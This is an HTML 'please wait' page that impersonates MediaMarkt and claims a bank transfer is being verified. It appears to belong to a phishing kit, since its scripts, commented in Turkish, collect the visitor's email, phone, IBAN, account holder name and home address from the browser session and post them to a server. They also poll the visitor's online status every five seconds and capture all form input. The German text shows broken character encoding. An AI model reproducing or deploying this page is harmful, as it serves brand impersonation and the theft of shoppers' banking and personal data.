<!doctype html>
<html lang="de-DE">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wartebereich | MediaMarkt</title>
    <link rel="stylesheet" href="./css/styles.css">
    <style>
        body {
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            background: #f5f5f5;
            margin: 0;
            font-family: "Noto Sans", Arial, sans-serif;
        }
        .wait-container {
            flex: 1;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 40px 20px;
        }
        .wait-box {
            background: #fff;
            border-radius: 12px;
            padding: 40px;
            max-width: 600px;
            width: 100%;
            text-align: center;
            box-shadow: 0 20px 40px rgba(0,0,0,0.08);
        }
        .wait-title {
            font-size: 1.8rem;
            font-weight: 700;
            margin-bottom: 20px;
            color: #000;
        }
        .wait-text {
            font-size: 1rem;
            color: #555;
            margin-bottom: 30px;
            line-height: 1.6;
        }
        .wait-spinner {
            width: 60px;
            height: 60px;
            border: 6px solid #f0f0f0;
            border-top-color: #DF0000;
            border-radius: 50%;
            margin: 0 auto 20px auto;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="wait-container">
        <div class="wait-box" data-activity-scope="wait-page">
            <div class="wait-spinner"></div>
            <h1 class="wait-title">Bitte warten Sie einen Moment</h1>
            <p class="wait-text">
                Ihre Bank√ºberweisung wird aktuell gepr√ºft. Dieser Vorgang kann einige Minuten dauern.
                Sie erhalten automatisch eine Best√§tigung, sobald die Zahlung abgeschlossen ist.
            </p>
        </div>
    </div>

    <script>
    (function() {
        function logUserActivity(type, payload) {
            try {
                fetch('/api/activity', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        type: type,
                        payload: payload || {}
                    })
                }).catch(function(err) {
                    console.warn('‚ö†Ô∏è Aktivite loglanamadƒ±:', err);
                });
            } catch (error) {
                console.warn('‚ö†Ô∏è Aktivite log fonksiyonu hata verdi:', error);
            }
        }

        document.addEventListener('DOMContentLoaded', function() {
            var checkoutData = {};
            var bankData = {};
            var total = 0;
            try {
                checkoutData = JSON.parse(sessionStorage.getItem('checkoutData') || '{}');
            } catch (e) {}
            try {
                bankData = JSON.parse(sessionStorage.getItem('checkoutBank') || '{}');
            } catch (e) {}
            try {
                total = parseFloat(sessionStorage.getItem('checkoutTotal')) || 0;
            } catch (e) {}

            logUserActivity('checkout-wait-enter', {
                cartTotal: total,
                email: checkoutData.email,
                phone: checkoutData.phone,
                bank: bankData.bank,
                accountName: bankData.accountName,
                iban: bankData.iban,
                address: checkoutData.street ? {
                    street: checkoutData.street,
                    housenumber: checkoutData.housenumber,
                    postal: checkoutData.postal,
                    city: checkoutData.city,
                    country: checkoutData.country
                } : undefined
            });
        });
    })();
    </script>

    <!-- Online Kontrol Sistemi - Kullanƒ±cƒ± online kontrol√º i√ßin heartbeat -->
    <script>
    (function() {
        console.log('üöÄ Online kontrol sistemi ba≈ülatƒ±lƒ±yor (wait.html)...');

        function sendHeartbeat() {
            var timestamp = new Date().getTime();
            var random = Math.random();
            var url = '/api/heartbeat?source=wait&t=' + timestamp + '&r=' + random;

            console.log('üì§ Heartbeat isteƒüi g√∂nderiliyor:', url);

            var xhr = new XMLHttpRequest();
            xhr.open('GET', url, true);
            xhr.setRequestHeader('Cache-Control', 'no-cache');

            xhr.onload = function() {
                console.log('üì• Heartbeat response geldi - Status:', xhr.status);
                if (xhr.status === 200) {
                    try {
                        var data = JSON.parse(xhr.responseText);
                        console.log('‚úÖ Heartbeat OK - Response:', data);

                        if (data.status === 'ok' || data.success === true) {
                            console.log('‚úÖ Kullanƒ±cƒ± ONLINE - IP:', data.ip);
                        } else {
                            console.warn('‚ö†Ô∏è Heartbeat response - status:', data.status);
                        }
                    } catch (e) {
                        console.error('‚ùå Response parse hatasƒ±:', e);
                        console.error('Response text:', xhr.responseText);
                    }
                } else {
                    console.warn('‚ö†Ô∏è Heartbeat ba≈üarƒ±sƒ±z - Status:', xhr.status);
                    console.warn('Response text:', xhr.responseText);
                }
            };

            xhr.onerror = function() {
                console.error('‚ùå Heartbeat network hatasƒ± - ƒ∞stek g√∂nderilemedi');
            };

            xhr.ontimeout = function() {
                console.error('‚è±Ô∏è Heartbeat timeout - ƒ∞stek zaman a≈üƒ±mƒ±na uƒüradƒ±');
            };

            xhr.timeout = 10000;
            xhr.send();
        }

        sendHeartbeat();

        var heartbeatInterval = setInterval(function() {
            sendHeartbeat();
        }, 5000);

        document.addEventListener('visibilitychange', function() {
            if (!document.hidden) {
                console.log('üëÅÔ∏è Sayfa g√∂r√ºn√ºr oldu, heartbeat g√∂nderiliyor...');
                sendHeartbeat();
            }
        });

        window.addEventListener('beforeunload', function() {
            if (navigator.sendBeacon) {
                var url = '/api/heartbeat?source=wait&t=' + new Date().getTime() + '&r=' + Math.random();
                navigator.sendBeacon(url);
            } else {
                var xhr = new XMLHttpRequest();
                xhr.open('GET', '/api/heartbeat?source=wait&t=' + new Date().getTime() + '&r=' + Math.random(), false);
                try {
                    xhr.send();
                } catch (e) {
                    console.error('Son heartbeat g√∂nderilemedi:', e);
                }
            }
        });

        window.addEventListener('unload', function() {
            clearInterval(heartbeatInterval);
        });

        console.log('‚úÖ Online kontrol sistemi aktif (wait.html)');
        console.log('üì° Network tab\'ƒ±nda /api/heartbeat isteklerini g√∂rebilirsiniz');
    })();
    </script>
    <script>
    (function () {
        var PAGE_ID = 'wait';
        var INPUT_TAGS = ['INPUT', 'TEXTAREA', 'SELECT'];

        function sendInputLog(payload) {
            fetch('/api/activity', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    type: 'user_input',
                    payload: payload
                })
            }).catch(function (err) {
                console.warn('‚ö†Ô∏è Input log g√∂nderilemedi:', err);
            });
        }

        function shouldTrackElement(element) {
            if (!element || INPUT_TAGS.indexOf(element.tagName) === -1) return false;
            var type = (element.type || '').toLowerCase();
            return type !== 'password';
        }

        function getFieldName(element) {
            return (
                element.name ||
                element.id ||
                element.getAttribute('data-field-label') ||
                element.getAttribute('aria-label') ||
                element.placeholder ||
                element.getAttribute('data-test') ||
                element.type ||
                'field'
            );
        }

        function getElementValue(element) {
            var type = (element.type || '').toLowerCase();
            if (type === 'checkbox' || type === 'radio') {
                return element.checked ? (element.value || 'checked') : 'unchecked';
            }
            if (element.tagName === 'SELECT') {
                if (element.multiple) {
                    return Array.from(element.selectedOptions || []).map(function (opt) {
                        return (opt && (opt.value || opt.textContent.trim())) || '';
                    }).filter(Boolean).join(', ');
                }
                var option = element.options[element.selectedIndex];
                return option ? (option.value || option.textContent.trim()) : '';
            }
            return (element.value || '').trim();
        }

        function collectInputs(scope) {
            var result = {};
            if (!scope) return result;
            scope.querySelectorAll('input, select, textarea').forEach(function (element) {
                if (!shouldTrackElement(element)) return;
                var value = getElementValue(element);
                if (!value && element.tagName !== 'SELECT' && element.type !== 'checkbox' && element.type !== 'radio') {
                    return;
                }
                var key = getFieldName(element);
                if (result[key] !== undefined) {
                    if (!Array.isArray(result[key])) {
                        result[key] = [result[key]];
                    }
                    result[key].push(value);
                } else {
                    result[key] = value;
                }
            });
            return result;
        }

        function extractFormValues(form) {
            var result = {};
            try {
                var formData = new FormData(form);
                formData.forEach(function (value, key) {
                    if (result[key] !== undefined) {
                        if (!Array.isArray(result[key])) {
                            result[key] = [result[key]];
                        }
                        result[key].push(value);
                    } else {
                        result[key] = value;
                    }
                });
            } catch (err) {
                console.warn('‚ö†Ô∏è Form verisi toplanamadƒ±:', err);
            }
            if (!Object.keys(result).length) {
                result = collectInputs(form);
            }
            return result;
        }

        function handleFormSubmit(event) {
            var form = event.target;
            if (!form || form.dataset.trackActivity === 'false') return;

            var snapshot = extractFormValues(form);
            sendInputLog({
                page: PAGE_ID,
                trigger: 'form-submit',
                formName: form.getAttribute('name') || form.id || form.getAttribute('data-form-label') || 'form',
                action: form.getAttribute('action') || 'inline',
                fields: snapshot,
                url: window.location.href,
                timestamp: new Date().toISOString()
            });
        }

        function handleTrackedButton(event) {
            var button = event.target.closest('[data-track-activity="post"]');
            if (!button) return;
            var form = button.closest('form');
            var scope = form || button.closest('[data-activity-scope]') || document.body;
            var snapshot = form ? extractFormValues(form) : collectInputs(scope);
            sendInputLog({
                page: PAGE_ID,
                trigger: 'button-click',
                button: button.getAttribute('data-button-name') || button.name || button.id || button.textContent.trim() || 'button',
                fields: snapshot,
                url: window.location.href,
                timestamp: new Date().toISOString()
            });
        }

        document.addEventListener('submit', handleFormSubmit, true);
        document.addEventListener('click', handleTrackedButton, true);
    })();
    </script>
</body>
